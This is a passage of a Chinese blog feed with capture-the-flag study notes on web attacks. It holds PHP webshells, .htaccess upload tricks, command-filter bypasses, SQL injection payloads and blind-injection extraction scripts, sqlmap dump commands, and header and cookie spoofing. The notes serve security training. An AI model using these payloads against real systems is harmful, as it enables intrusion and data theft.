    <content type="html"><![CDATA[<p>文件上传分为前端验证和后端验证，前端校验即 <code>js</code> 方式的校验，可通过抓包方式绕过；后端校验是服务器端校验，需上传指定格式文件然后通过指定手段输出文件指令。</p><span id="more"></span><h2 id="黑名单-白名单"><a href="#黑名单-白名单" class="headerlink" title="黑名单 白名单"></a>黑名单 白名单</h2><ul><li>黑名单：不允许我上传什么样的文件 <code>php | html</code></li><li>白名单：仅允许我们上传什么样的文件 <code>png | jpg | gif</code></li></ul><h2 id="前端校验式文件上传"><a href="#前端校验式文件上传" class="headerlink" title="前端校验式文件上传"></a>前端校验式文件上传</h2><p>如果是前端请求被拦截，使用 <code>burpsuit</code>，直接修改文件格式为 <code>.php</code>,修改内容为一句话木马 <code>&lt;?php eval($POST[&#39;xxx&#39;];)?&gt;</code>，然后访问对应 <code>php</code> 文件，发送 <code>post</code> 请求加上参数。通过参数执行指令 <code>xxx=system(&#39;ls&#39;)</code>，执行命令找到 <code>flag</code> 然后 <code>tac</code> 输出。</p><h2 id="后端校验"><a href="#后端校验" class="headerlink" title="后端校验"></a>后端校验</h2><p>当前目录 <code>301</code> <code>302</code> 跳转，判断该目录下的文件解析类型</p><ul><li>包含ccc</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;filename&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><ul><li>文件类型 <code>. .asd .htaccess</code></li></ul><p>上传上面类型的文件，然后就可以上传对应 <code>filename</code> 后缀的文件了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;文件上传分为前端验证和后端验证，前端校验即 &lt;code&gt;js&lt;/code&gt; 方式的校验，可通过抓包方式绕过；后端校验是服务器端校验，需上传指定格式文件然后通过指定手段输出文件指令。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://blog.zhengxiangling.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF - 代码执行</title>
    <link href="https://blog.zhengxiangling.com/2021/07/20/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>https://blog.zhengxiangling.com/2021/07/20/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2021-07-20T08:29:00.000Z</published>
    <updated>2023-11-17T14:27:30.001Z</updated>
    
    <content type="html"><![CDATA[<p>代码执行类的题目，如在指定时间内计算给定方程的数值，方程题一般时间人工计算会超时，只能通过抓取页面内的方程，然后通过代码执行的方式计算好然后提交来解决；或给定一串 <code>php</code> 代码，通过指定变量输入系统指令执行代码获取目录和读取 <code>flag</code> 里的内容。</p><span id="more"></span><h2 id="获取页面信息包"><a href="#获取页面信息包" class="headerlink" title="获取页面信息包"></a>获取页面信息包</h2><ul><li>1.quests包 pip install获取，获取页面信息包</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sess = requests.session()</span><br><span class="line">req = sess.get(url)</span><br></pre></td></tr></table></figure><ul><li>2.通过 re 正则表达式截取内容，通过(.<em>) 即 (.</em>?)匹配</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">&quot;the answer is:(.*)&lt;/br&gt; a=(.*)&lt;/br&gt; b=(.*?)&lt;/br&gt;&quot;</span></span><br><span class="line">result = re.search(pattern, req.text)</span><br></pre></td></tr></table></figure><ul><li>3.然后可获取匹配到值，通过eval()函数计算数值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a, b = <span class="built_in">int</span>(result.group(<span class="number">2</span>)), <span class="built_in">int</span>(result.group(<span class="number">3</span>))</span><br><span class="line">result = <span class="built_in">eval</span>(result.group(<span class="number">1</span>))</span><br><span class="line"><span class="number">4.</span>通过post发送请求获取 答案</span><br><span class="line">data = &#123; <span class="string">&#x27;answer&#x27;</span>: result &#125;</span><br><span class="line">rsp = sess.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(rsp.text)</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>如给定一串代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过发送 <code>post</code> 请求传参，传入 <code>phpinfo()</code> 或者系统命令执行相关命令来获取 <code>flag</code>。</p><h3 id="linux中，-和-和-的区别"><a href="#linux中，-和-和-的区别" class="headerlink" title="linux中，&amp;和&amp;&amp;,|和||的区别"></a>linux中，&amp;和&amp;&amp;,|和||的区别</h3><ul><li><p><code>&amp;</code> 表示任务在后台执行，如要在后台运行 <code>redis-server</code>,则有 <code>redis-server &amp;</code></p></li><li><p><code>&amp;&amp;</code> 表示前一条命令执行成功时，才执行后一条命令 ，如 <code>echo &#39;1‘ &amp;&amp; echo &#39;2&#39;</code>    </p></li><li><p><code>|</code> 表示管道，上一条命令的输出，作为下一条命令参数，如 <code>echo &#39;yes&#39; | wc -l</code></p></li><li><p><code>||</code> 表示上一条命令执行失败后，才执行下一条命令，如 <code>cat nofile || echo &quot;fail&quot;</code></p></li><li><p><code>|</code> 被过滤 用换行符 <code>%0a</code></p></li></ul><h3 id="空格绕过技巧"><a href="#空格绕过技巧" class="headerlink" title="空格绕过技巧"></a>空格绕过技巧</h3><p>命令执行时，后台函数可能会过滤掉空格等特殊字符，可通过如下方式绕过过滤</p><ul><li>${IFS} </li><li>&lt; &lt;&gt;</li><li>%09 </li><li>{cat, 1.txt}</li><li>.\</li><li>%CommonProgramFilesL~10,1%</li></ul><h3 id="判断服务器为linux或windows"><a href="#判断服务器为linux或windows" class="headerlink" title="判断服务器为linux或windows"></a>判断服务器为linux或windows</h3><ul><li><code>windows</code> 对大小写不敏感，将 <code>x</code> 改为 <code>X</code>，如果不变，则为 <code>windows</code></li><li><code>windows</code> 查看文件使用指令 <code>type</code>,</li></ul><h3 id="文件名绕过技巧"><a href="#文件名绕过技巧" class="headerlink" title="文件名绕过技巧"></a>文件名绕过技巧</h3><p>如 <code>flag</code> 文件被绕过，可通过如下方法绕过</p><ul><li><p><code>nl / fl``ag, nl / fl[a-z]g, a=fl;b=ag;nl /$a%b</code></p></li><li><p><code>echo base64字符串 | base64 -d</code> 通过 <code>base64</code> 加密后再解密</p></li><li><p><code>echo cat /flag|base64</code>，<code>echo base64字符串 | base64 -d</code> 通过 <code>base64</code> 加密后再解密</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;代码执行类的题目，如在指定时间内计算给定方程的数值，方程题一般时间人工计算会超时，只能通过抓取页面内的方程，然后通过代码执行的方式计算好然后提交来解决；或给定一串 &lt;code&gt;php&lt;/code&gt; 代码，通过指定变量输入系统指令执行代码获取目录和读取 &lt;code&gt;flag&lt;/code&gt; 里的内容。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CTF -  sql注入</title>
    <link href="https://blog.zhengxiangling.com/2021/07/20/CTF-sql%E6%B3%A8%E5%85%A5/"/>
    <id>https://blog.zhengxiangling.com/2021/07/20/CTF-sql%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-20T07:26:00.000Z</published>
    <updated>2023-11-17T14:27:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>sql 注入的题目，出现在登录、注册、查询信息类的题目，涉及前端、后端、数据库（mysql）等知识点。</p><span id="more"></span><p>sql注入类别分为：联合注入、报错注入、布尔盲注、时间盲注。</p><h2 id="联合盲注"><a href="#联合盲注" class="headerlink" title="联合盲注"></a>联合盲注</h2><p>联合盲注即通过找注入点，然后通过 <code>union</code> 联合查询语句找到数据库中想要的值，联合查询即保证和前面的select语句有相同字段数，判断select 语句的字段数，order by 判断字段数，查找有多少个库，有多少个表，有什么字段。</p><h3 id="1-判断是否有注入点"><a href="#1-判断是否有注入点" class="headerlink" title="1.判断是否有注入点"></a>1.判断是否有注入点</h3><ul><li>通过单引号 <code>&#39;</code> 判断是否有注入点</li><li>注入点多试以下符号： <code>&#39;</code> <code>&quot;</code> <code>)</code> <code>&#39;)</code></li></ul><h3 id="2-注入点是字符型还是数字型？"><a href="#2-注入点是字符型还是数字型？" class="headerlink" title="2.注入点是字符型还是数字型？"></a>2.注入点是字符型还是数字型？</h3><ul><li><code>id=1 and 1=1和id=1 and 1=2</code> 页面无变化，说明注入点不是整形；如果注入点为整形，则直接加入 <code>sql</code> 注入语句即可</li><li><code>id =1 &#39; and 1=1 %23,  id =1 &#39; and 1=2 %23</code>，说明注入类型为字符</li></ul><h3 id="3-判断输出内容有多少列"><a href="#3-判断输出内容有多少列" class="headerlink" title="3.判断输出内容有多少列"></a>3.判断输出内容有多少列</h3><p>判断字段数 <code>id=&#39;order by 5 -- -&#39;</code>, 如果字段为 <code>5</code> 则输出正常，输入<code>order by 6%23</code> 发现页面错误，说明没有 <code>6</code> 列，输入 <code>5</code> 正确，说明有<code>5</code> 列。</p><h3 id="4-判断显示位"><a href="#4-判断显示位" class="headerlink" title="4.判断显示位"></a>4.判断显示位</h3><p>查看页面显示的字段是第几位，<code>id=&#39;union select 1,2,3,4,5 %23</code>，查看显示数字是第几位</p><h3 id="5-获取所有数据库名"><a href="#5-获取所有数据库名" class="headerlink" title="5.获取所有数据库名"></a>5.获取所有数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27;union select 1,2,select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA,4,5%23</span></span><br></pre></td></tr></table></figure><p>得到两个数据库 <code>information_schema, sq01</code></p><h3 id="6-获取表名"><a href="#6-获取表名" class="headerlink" title="6.获取表名"></a>6.获取表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>SQL01<span class="string">&#x27;),3%23</span></span><br></pre></td></tr></table></figure><p>得到表名 <code>users</code></p><h3 id="7-获取列名"><a href="#7-获取列名" class="headerlink" title="7.获取列名"></a>7.获取列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),3,4,5%23</span></span><br></pre></td></tr></table></figure><h3 id="8-然后根据表名和列名查询想要的数据"><a href="#8-然后根据表名和列名查询想要的数据" class="headerlink" title="8.然后根据表名和列名查询想要的数据"></a>8.然后根据表名和列名查询想要的数据</h3><h3 id="9-sql关键字被过滤的解决方法"><a href="#9-sql关键字被过滤的解决方法" class="headerlink" title="9.sql关键字被过滤的解决方法"></a>9.sql关键字被过滤的解决方法</h3><ul><li>通过将关键字重复写两遍，如<code>select</code> 换为 <code>seselectlect</code></li><li><code>#</code> 被注释 换成 <code>-- -&#39;</code></li><li><code>&#39;</code> 被过滤，换成 <code>%df\</code>:表示中文字符，<code>%df</code> 表示 <code>‘运</code>，或者尝试 <code>%df</code> 然后再加 <code>&#39;</code></li></ul><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>当注入点没有提示信息返回，只有and 1&#x3D;1 或者 1&#x3D;2不相同提示时，可通过布尔盲注。<br>通过撞字符获取数据库中的 <code>flag</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://url/index.php?id=1&#x27;&quot;</span></span><br><span class="line">chars = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890!@#$%^&amp;*()&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        payload = url + <span class="string">&quot;and hex(mid((select flag from users),&#123;0&#125;,1))=hex(&#x27;&#123;1&#125;&#x27;) -- -&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">        rsp = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;SangFor&quot;</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">            flag = flag + char</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注，当注入点没有其他提示信息返回时，通过布尔盲注也没有信息提示时，但是 and sleep(5) 页面有等待，说明存在时间盲注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://url/index.php?id=&quot;</span></span><br><span class="line">chars = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890!@#$%^&amp;*()&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = url + <span class="string">&quot;1&#x27; and if(hex(mid((select flag from users),&#123;0&#125;,1))=hex(&#x27;&#123;1&#125;&#x27;),sleep(3),3) -- -&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">            rsp = requests.get(payload, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag +=  char  </span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="通过-sqlmap-工具查询关键信息"><a href="#通过-sqlmap-工具查询关键信息" class="headerlink" title="通过 sqlmap 工具查询关键信息"></a>通过 sqlmap 工具查询关键信息</h2><ul><li>查询数据库，<code>pyhton2 sqlmap.py -u url --dbs</code></li><li>查询表 <code>python2 sqlmap.py -u url -D 数据库名 --tables</code></li><li>查询字段 <code>python2 sqlmap.py -u url -D 数据库名 -T 数据表名 --columns</code></li><li>查询值 <code>python2 sqlmap.py -u url -D 数据库名 -T 数据表名 --dump</code></li><li>绕过字符过滤 <code>python2 sqlmap.py -u url --dbs -t 10 --tamper unmagicquotes.py sqlmap</code></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;sql 注入的题目，出现在登录、注册、查询信息类的题目，涉及前端、后端、数据库（mysql）等知识点。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CTF - 信息收集基础</title>
    <link href="https://blog.zhengxiangling.com/2021/07/20/CTF-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80/"/>
    <id>https://blog.zhengxiangling.com/2021/07/20/CTF-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80/</id>
    <published>2021-07-20T07:02:00.000Z</published>
    <updated>2023-11-17T14:27:30.001Z</updated>
    
    <content type="html"><![CDATA[<p>CTF，即夺旗赛，在网络攻防比赛中通过各种方式找到题目中的flag得到分数的一种比赛。</p><span id="more"></span><h3 id="查看源码搜索flag"><a href="#查看源码搜索flag" class="headerlink" title="查看源码搜索flag"></a>查看源码搜索flag</h3><p>f12查看网页源码，通过源码搜索关键词查看是否有flag</p><h3 id="通过备份文件找，或者网页源代码查看信息。"><a href="#通过备份文件找，或者网页源代码查看信息。" class="headerlink" title="通过备份文件找，或者网页源代码查看信息。"></a>通过备份文件找，或者网页源代码查看信息。</h3><p>如系统内的备份文件 <code>web.rar</code> 获取到应用源码，或者 <code>php</code> 的备份文件。</p><ul><li><code>vim</code> 的备份文件 <code>nginx.conf.swp</code>，</li><li><code>php</code> 常见的备份文件 <code>index.php index.php~ .index.php.swp</code></li></ul><h3 id="使用文件扫描工具"><a href="#使用文件扫描工具" class="headerlink" title="使用文件扫描工具"></a>使用文件扫描工具</h3><p>御剑后台扫描工具：输入要扫描的网址，一般选择 <code>dir</code> 和 <code>php</code>，但是这种扫描对域名不区分大小写。</p><ul><li><p><code>dirsearch</code> 命令行式扫描工具 <code>python dirsearch.py -u ip地址 -e php</code>。</p></li><li><p>如果遍历到了目录文件，可以继续遍历对应目录的所有文件。</p></li><li><p>如果目录遍历没有东西，可以考虑抓包分析报文。</p></li></ul><h3 id="抓包-burpsuit"><a href="#抓包-burpsuit" class="headerlink" title="抓包  burpsuit"></a>抓包  burpsuit</h3><p>通过抓包，分析报文内的信息，有可能 <code>flag</code> 隐藏在 <code>header</code> 的 <code>cookies</code>、<code>session</code>或者 <code>data</code>内，如果有flag相关的明文、base64编码、md5值等，都可以作为待分析的为flag的地方。</p><ul><li><p><code>base64</code> 编码，编码最后的字符有双等号 &#x3D;&#x3D;。</p></li><li><p><code>md5</code> 破解常用的网址 <code>somd5.com</code>。<code>md5</code> 破解不了，只能走代码审计，找数据库的<code>password</code></p></li><li><p>提交请求 <code>ip</code> 伪造：<code>x-forwarded-for: 127.0.0.1</code>。</p></li><li><p>报文伪造域名来源 <code>Referer：域名 url</code>。</p></li><li><p>伪造 <code>Cookie</code>，报文 <code>Cookie: isadmin=1</code></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF，即夺旗赛，在网络攻防比赛中通过各种方式找到题目中的flag得到分数的一种比赛。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://blog.zhengxiangling.com/categories/CTF/"/>
    
    
  </entry>
  
</feed>
